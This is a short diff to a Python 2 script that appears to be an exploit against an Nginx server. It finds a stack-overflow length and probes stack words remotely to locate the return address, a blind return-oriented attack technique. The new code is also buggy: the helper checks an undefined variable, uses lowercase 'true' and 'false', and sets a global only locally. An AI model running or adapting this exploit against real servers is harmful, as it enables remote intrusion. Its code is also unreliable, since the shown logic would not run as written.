@@ -5,6 +5,8 @@ from time import sleep
 import struct
 
 overflow_len = 0
+#No idea wtf this is
+origin = None
 
 class Nginx:
 	def __init__(self,ip,port):
@@ -108,6 +110,16 @@ def find_overflow_len(target):
 	overflow_len-=1
 	print "Found overflow length - it is: " + str(overflow_len) + " bytes!"
 
+def found_rip(word):
+	TEXT	    =  0x400000
+	limit = TEXT + 0x600000
+
+	if TEXT < w < limit:
+		origin = TEXT
+		return true
+
+	return false
+
 def find_rip(target):
 	words = []
 	while True:
@@ -116,7 +128,12 @@ def find_rip(target):
 			payload +=  struct.pack("<I",word)
 
 		w = stack_read_word(payload,target)
-		print "FOUND A WORD!"
+		if w == None:
+			words = [0 for i in words]
+			continue
+		if not found_rip(w):
+			continue
+		print "FOUND RIP"
 		break
 def stack_read_word(payload,target):
 	word = ""
